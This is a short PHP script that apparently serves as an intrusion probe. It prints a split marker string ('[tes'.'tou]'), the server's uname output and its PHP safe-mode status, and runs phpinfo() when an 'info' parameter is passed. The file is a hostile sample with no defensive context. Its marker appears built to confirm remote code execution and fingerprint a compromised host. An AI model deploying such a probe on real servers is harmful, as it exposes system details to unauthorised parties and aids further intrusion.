<?php

if ($_GET['info']){

phpinfo();
}


echo '[tes'.'tou]-';
$uname = @php_uname();


 $SafeMode = @ini_get('safe_mode');



 if ($SafeMode == '') { $SafeMode = " SAFEMODE-OFF"; }

 else { $SafeMode = " SAFEMODE-[$SafeMode]"; }
 
  if ($SafeMode == 0) { $SafeMode = " SAFEMODE-OFF"; }
 
echo $uname.$SafeMode;

?>